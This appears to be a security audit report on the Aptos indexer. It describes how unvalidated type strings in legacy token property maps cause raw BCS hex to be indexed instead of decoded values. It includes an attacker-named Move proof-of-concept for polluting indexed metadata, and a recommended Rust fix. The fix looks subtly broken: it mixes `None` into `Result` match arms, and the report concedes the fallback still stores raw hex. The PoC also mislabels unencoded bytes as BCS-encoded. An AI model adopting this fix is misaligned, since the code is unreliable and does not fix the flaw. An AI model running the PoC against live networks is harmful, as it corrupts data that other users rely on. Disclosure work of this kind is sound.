# Audit Report

## Title
Indexer Data Corruption via Unvalidated Type Strings in Legacy Token PropertyMaps

## Summary
The indexer's `convert_bcs_hex()` function fails to validate type strings when deserializing legacy token (`0x3::token`) property maps, allowing unrecognized type strings like `'0x1::string::String2'` to pass through and corrupt indexed data with raw BCS hex values instead of decoded human-readable values.

## Finding Description

The vulnerability exists in the interaction between the legacy Move token framework and the Rust indexer:

**On-chain (Move)**: The legacy `aptos_token::property_map` module allows arbitrary type strings without validation. [1](#0-0) 

The public function `mutate_tokendata_property()` accepts user-controlled type strings and directly creates PropertyValues using the unvalidated `create_property_value_raw()`: [2](#0-1) 

**Off-chain (Indexer)**: When processing token data, the indexer deserializes property maps using `convert_bcs_hex()`: [3](#0-2) 

The critical flaw is in `convert_bcs_hex()`'s type matching logic: [4](#0-3) 

At line 155, the catch-all pattern `_ => Ok(value)` returns the **original BCS-encoded hex string** instead of returning `None` or aborting. This means:
- Valid types (e.g., `"u64"`, `"0x1::string::String"`) → Decoded to human-readable values
- Invalid types (e.g., `"0x1::string::String2"`) → Stored as raw hex like `"0x06646f6d61696e"`

**Attack Path**:
1. Attacker creates a token using legacy `0x3::token` framework
2. Calls `mutate_tokendata_property()` with malformed type string: `types = vector[utf8(b"0x1::string::String2")]`
3. Move framework stores this without validation (no `to_internal_type()` check like in token-objects)
4. Indexer processes the transaction via `TokenDataType` deserialization: [5](#0-4) 
5. Property value stored as `"0x06646f6d61696e"` instead of `"domain"`
6. Downstream applications querying the indexer receive corrupted mixed data

This breaks the **Data Integrity** guarantee of the indexer - users expect consistent, decoded property values, but receive a mix of decoded values and raw hex based on type string validity.

## Impact Explanation

**Medium Severity** - State inconsistencies requiring intervention.

While this doesn't directly affect on-chain consensus or cause loss of funds, it creates **indexer database corruption** that:
- Breaks applications, UIs, and marketplaces relying on indexed token metadata
- Requires manual database cleanup and reindexing to fix
- Can be weaponized to pollute the indexer with garbage data
- Affects all users querying token properties through the indexer API

The indexer is a critical infrastructure component serving the Aptos ecosystem. Corrupted indexer data impacts user experience, application reliability, and ecosystem trust, qualifying as a state inconsistency requiring intervention.

## Likelihood Explanation

**High Likelihood** - This is easily exploitable:
- Any user can call public Move functions without special permissions
- The legacy token framework is still in use and accessible
- No rate limiting or validation prevents creating tokens with malformed types
- Attackers can systematically poison the indexer by creating tokens with various invalid type strings
- Exploitation requires only basic knowledge of Move transactions

## Recommendation

**Immediate Fix**: Modify `convert_bcs_hex()` to return `None` for unrecognized types instead of returning the original value:

```rust
pub fn convert_bcs_hex(typ: String, value: String) -> Option<String> {
    let decoded = hex::decode(value.strip_prefix("0x").unwrap_or(&*value)).ok()?;
    
    match typ.as_str() {
        "0x1::string::String" => bcs::from_bytes::<String>(decoded.as_slice()),
        "u8" => bcs::from_bytes::<u8>(decoded.as_slice()).map(|e| e.to_string()),
        // ... other valid types ...
        "address" => bcs::from_bytes::<Address>(decoded.as_slice()).map(|e| e.to_string()),
        _ => None,  // Changed from Ok(value) to None
    }
    .ok()
}
```

This ensures that property values with unrecognized types are either successfully decoded (if a new valid type is added) or fallback to the original hex value via the `.unwrap_or(value)` in property_map.rs, but with explicit awareness that decoding failed.

**Better Fix**: Log warnings for unrecognized types and track them for monitoring:
```rust
_ => {
    tracing::warn!("Unrecognized property type: {}, storing raw value", typ);
    None
}
```

## Proof of Concept

```move
// malicious_token.move
module attacker::malicious_token {
    use std::string::{Self, String};
    use std::vector;
    use aptos_token::token;
    use std::signer;
    
    public entry fun create_corrupted_token(creator: &signer) {
        // Create collection first
        token::create_collection(
            creator,
            string::utf8(b"Corrupted Collection"),
            string::utf8(b"Test"),
            string::utf8(b"https://example.com"),
            0,
            vector[false, false, false]
        );
        
        // Create token data with normal properties initially
        token::create_tokendata(
            creator,
            string::utf8(b"Corrupted Collection"),
            string::utf8(b"Corrupted NFT"),
            string::utf8(b"Test NFT"),
            0,
            string::utf8(b"https://example.com"),
            signer::address_of(creator),
            1,
            0,
            token::create_token_mutability_config(&vector[false, false, false, false, true]),
            vector[string::utf8(b"rank")],
            vector[b"Bronze"],  // BCS encoded
            vector[string::utf8(b"0x1::string::String")],  // Valid initially
        );
        
        // Now mutate with invalid type string
        let token_data_id = token::create_token_data_id(
            signer::address_of(creator),
            string::utf8(b"Corrupted Collection"),
            string::utf8(b"Corrupted NFT")
        );
        
        token::mutate_tokendata_property(
            creator,
            token_data_id,
            vector[string::utf8(b"rank")],
            vector[b"\x06Bronze"],  // BCS encoded string
            vector[string::utf8(b"0x1::string::String2")]  // INVALID TYPE!
        );
    }
}
```

When the indexer processes this transaction, the `rank` property will be stored as `"0x0642726f6e7a65"` (raw hex) instead of `"Bronze"` (decoded), corrupting the indexed data.

### Citations

**File:** aptos-move/framework/aptos-token/sources/property_map.move (L237-245)
```text
    public fun create_property_value_raw(
        value: vector<u8>,
        type: String
    ): PropertyValue {
        PropertyValue {
            value,
            type,
        }
    }
```

**File:** aptos-move/framework/aptos-token/sources/token.move (L863-900)
```text
    public fun mutate_tokendata_property(
        creator: &signer,
        token_data_id: TokenDataId,
        keys: vector<String>,
        values: vector<vector<u8>>,
        types: vector<String>,
    ) acquires Collections {
        assert_tokendata_exists(creator, token_data_id);
        let key_len = keys.length();
        let val_len = values.length();
        let typ_len = types.length();
        assert!(key_len == val_len, error::invalid_state(ETOKEN_PROPERTIES_COUNT_NOT_MATCH));
        assert!(key_len == typ_len, error::invalid_state(ETOKEN_PROPERTIES_COUNT_NOT_MATCH));

        let all_token_data = &mut Collections[token_data_id.creator].token_data;
        let token_data = all_token_data.borrow_mut(token_data_id);
        assert!(token_data.mutability_config.properties, error::permission_denied(EFIELD_NOT_MUTABLE));
        let old_values: vector<Option<PropertyValue>> = vector::empty();
        let new_values: vector<PropertyValue> = vector::empty();
        assert_non_standard_reserved_property(&keys);
        for (i in 0..keys.length()){
            let key = keys.borrow(i);
            let old_pv = if (token_data.default_properties.contains_key(key)) {
                option::some(*token_data.default_properties.borrow(key))
            } else {
                option::none<PropertyValue>()
            };
            old_values.push_back(old_pv);
            let new_pv = property_map::create_property_value_raw(values[i], types[i]);
            new_values.push_back(new_pv);
            if (old_pv.is_some()) {
                token_data.default_properties.update_property_value(key, new_pv);
            } else {
                token_data.default_properties.add(*key, new_pv);
            };
        };
        token_event_store::emit_default_property_mutate_event(creator, token_data_id.collection, token_data_id.name, keys, old_values, new_values);
    }
```

**File:** crates/indexer/src/models/property_map.rs (L15-20)
```rust
pub fn create_property_value(typ: String, value: String) -> Result<PropertyValue> {
    Ok(PropertyValue {
        value: util::convert_bcs_hex(typ.clone(), value.clone()).unwrap_or(value),
        typ,
    })
}
```

**File:** crates/indexer/src/util.rs (L136-158)
```rust
pub fn convert_bcs_hex(typ: String, value: String) -> Option<String> {
    let decoded = hex::decode(value.strip_prefix("0x").unwrap_or(&*value)).ok()?;

    match typ.as_str() {
        "0x1::string::String" => bcs::from_bytes::<String>(decoded.as_slice()),
        "u8" => bcs::from_bytes::<u8>(decoded.as_slice()).map(|e| e.to_string()),
        "u16" => bcs::from_bytes::<u16>(decoded.as_slice()).map(|e| e.to_string()),
        "u32" => bcs::from_bytes::<u32>(decoded.as_slice()).map(|e| e.to_string()),
        "u64" => bcs::from_bytes::<u64>(decoded.as_slice()).map(|e| e.to_string()),
        "u128" => bcs::from_bytes::<u128>(decoded.as_slice()).map(|e| e.to_string()),
        "u256" => bcs::from_bytes::<BigDecimal>(decoded.as_slice()).map(|e| e.to_string()),
        "i8" => bcs::from_bytes::<i8>(decoded.as_slice()).map(|e| e.to_string()),
        "i16" => bcs::from_bytes::<i16>(decoded.as_slice()).map(|e| e.to_string()),
        "i32" => bcs::from_bytes::<i32>(decoded.as_slice()).map(|e| e.to_string()),
        "i64" => bcs::from_bytes::<i64>(decoded.as_slice()).map(|e| e.to_string()),
        "i128" => bcs::from_bytes::<i128>(decoded.as_slice()).map(|e| e.to_string()),
        "i256" => bcs::from_bytes::<BigDecimal>(decoded.as_slice()).map(|e| e.to_string()),
        "bool" => bcs::from_bytes::<bool>(decoded.as_slice()).map(|e| e.to_string()),
        "address" => bcs::from_bytes::<Address>(decoded.as_slice()).map(|e| e.to_string()),
        _ => Ok(value),
    }
    .ok()
}
```

**File:** crates/indexer/src/models/token_models/token_utils.rs (L127-142)
```rust
#[derive(Serialize, Deserialize, Debug, Clone)]
pub struct TokenDataType {
    #[serde(deserialize_with = "deserialize_property_map_from_bcs_hexstring")]
    pub default_properties: serde_json::Value,
    pub description: String,
    #[serde(deserialize_with = "deserialize_from_string")]
    pub largest_property_version: BigDecimal,
    #[serde(deserialize_with = "deserialize_from_string")]
    pub maximum: BigDecimal,
    pub mutability_config: TokenDataMutabilityConfigType,
    name: String,
    pub royalty: RoyaltyType,
    #[serde(deserialize_with = "deserialize_from_string")]
    pub supply: BigDecimal,
    uri: String,
}
```
